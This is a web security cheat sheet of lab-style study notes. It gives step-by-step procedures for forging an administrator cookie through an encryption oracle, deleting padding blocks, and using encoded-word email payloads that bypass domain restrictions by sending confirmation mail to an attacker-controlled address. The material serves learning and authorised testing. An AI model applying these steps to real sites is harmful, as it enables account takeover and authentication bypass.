# Cheat Sheets — Web Security

---

## 1. Business Logic Vulnerability Testing Checklist

```
[ ] Try negative values in quantity and price fields
[ ] Try zero values
[ ] Try extremely large values (integer overflow)
[ ] Skip steps in multi-step workflows
[ ] Repeat the same step multiple times
[ ] Go backwards in a workflow
[ ] Access steps directly by URL (forced browsing)
[ ] Apply coupons multiple times
[ ] Combine features that were not meant to be combined
[ ] Modify encrypted cookies
[ ] Check if security rules are enforced everywhere
[ ] Try changing email after registration
[ ] Submit very long input (truncation attacks)
[ ] Look for error messages that reveal backend behavior
```

---

## 2. How to Identify Encrypted Values

```
Step 1: Look at the shape
        Random looking?       → possibly encrypted
        Ends with == or =?    → Base64
        Only 0-9 and a-f?     → Hex encoded
        Starts with eyJ?      → JWT token
        Has two dots?         → JWT token

Step 2: Try decoding in Burp Decoder
        URL decode → Base64 decode
        Readable text?        → just encoded, NOT encrypted
        Random bytes/gibberish → likely encrypted

Step 3: Check the length
        Decoded length multiple of 16? → likely AES encrypted

Step 4: Tamper with it
        Change one character → send request
        500 error or invalid? → definitely encrypted or signed

Step 5: Look at location
        stay-logged-in cookie → almost always encrypted
        session cookie        → encrypted or signed
        remember_me cookie    → almost always encrypted
```

---

## 3. Encryption Oracle Attack Steps

```
Step 1: Find encryption oracle
        Which input parameter produces an encrypted output?
        Watch for Set-Cookie headers after submitting input

Step 2: Find decryption oracle
        Which cookie/parameter decrypts and shows output?
        Watch for error messages that reflect your input

Step 3: Decrypt existing token
        Paste target cookie into decryption oracle
        Read the decrypted format (e.g. username:timestamp)

Step 4: Encrypt your forged value
        Use encryption oracle to encrypt privileged value
        e.g. administrator:timestamp

Step 5: Discover the prefix
        Decrypt your forged cookie
        Read the unwanted prefix in the response
        Count the prefix characters

Step 6: Calculate padding needed
        Formula: next multiple of 16 minus prefix length
        Example: prefix = 23 chars
                 next multiple of 16 above 23 = 32
                 padding needed = 32 - 23 = 9 characters

Step 7: Re-encrypt with padding
        Add padding characters before your value
        e.g. xxxxxxxxxadministrator:timestamp
        Encrypt again

Step 8: Remove prefix in Decoder
        URL decode → Base64 decode → switch to Hex view
        Select first N bytes (your multiple of 16)
        Right click → Delete selected bytes
        Base64 encode → URL encode

Step 9: Verify
        Paste result into decryption oracle
        Confirm output shows only your forged value
        No prefix, no padding

Step 10: Use the forged cookie
        Replace stay-logged-in cookie with forged value
        Delete session cookie entirely
        Send request → confirm admin access
```

---

## 4. Block Cipher Quick Reference

```
Block size:         16 bytes
Delete in chunks:   multiples of 16 only (16, 32, 48, 64...)

Prefix length → Padding needed → Bytes to delete
23 chars      → 9 chars        → 32 bytes (2 blocks)
10 chars      → 6 chars        → 16 bytes (1 block)
17 chars      → 15 chars       → 32 bytes (2 blocks)
33 chars      → 15 chars       → 48 bytes (3 blocks)

Formula:
padding = (next multiple of 16 above prefix length) - prefix length
delete  = prefix length + padding
```

---

## 5. Email Parser Discrepancy Testing

```
Step 1: Confirm domain restriction exists
        Try registering with @gmail.com → should be blocked

Step 2: Send standard probes (watch Burp Collaborator)
        =?iso-8859-1?q?=61=62=63?=collab@yourserver.com@targetdomain.com
        =?utf-8?q?=61=62=63?=collab@yourserver.com@targetdomain.com

Step 3: If no interaction, try Round 2
        =?utf-7?q?&AGEAYgBj-?=collab@yourserver.com@targetdomain.com
        =?x?q?=61=62=63?=collab@yourserver.com@targetdomain.com

Step 4: If no interaction, try Round 3
        =?utf-16?q?=61=62=63?=collab@yourserver.com@targetdomain.com
        =?utf-32?q?=61=62=63?=collab@yourserver.com@targetdomain.com

Step 5: Also test Base64 encoding method
        Replace ?q? with ?b? in all probes
        Replace encoded data with Base64 equivalent

Step 6: When interaction found → craft attack payload
        UTF-7: =?utf-7?q?attacker&AEA-yourserver.com&ACA-?=@targetdomain.com
        UTF-8: =?utf-8?q?attacker=40yourserver.com=20?=@targetdomain.com

Step 7: Register → check email client → click confirmation link
```

---

## 6. Burp Suite Quick Reference

```
Proxy    → Intercept requests
Repeater → Manually modify and resend requests
Intruder → Automate sending many requests
Decoder  → Encode and decode values
Macro    → Record and automate sequence of requests
Collaborator → Receive out of band DNS/HTTP/SMTP interactions

Turbo Intruder → High speed automated requests
                 Payload position marked with %s
                 Uses Jython (Python 2) — no f-strings
                 Use "{:04d}".format(n) not f"{n:04d}"
```

---

## 7. UTF-7 Most Important Characters

```
@      &AEA-
space  &ACA-
"      &ACI-
<      &ADw-
>      &ADg-
:      &ADoA-
.      &AC4-
/      &AC8-
=      &AD0-
+      &ACsA-
null   &AAA-
```

---

## 8. UTF-8 Q-Encoding Most Important Characters

```
@      =40
space  =20
"      =22
<      =3c
>      =3e
:      =3a
.      =2e
/      =2f
=      =3d
+      =2b
null   =00
```

---

## 9. Session vs Stay-Logged-In Cookie

```
Both present:
→ App uses session cookie
→ Stay-logged-in ignored

Session deleted:
→ App falls back to stay-logged-in cookie
→ Decrypts it to identify user

Attack use:
→ Delete session cookie
→ Replace stay-logged-in with forged cookie
→ App reads forged cookie → logs you in as target user
```

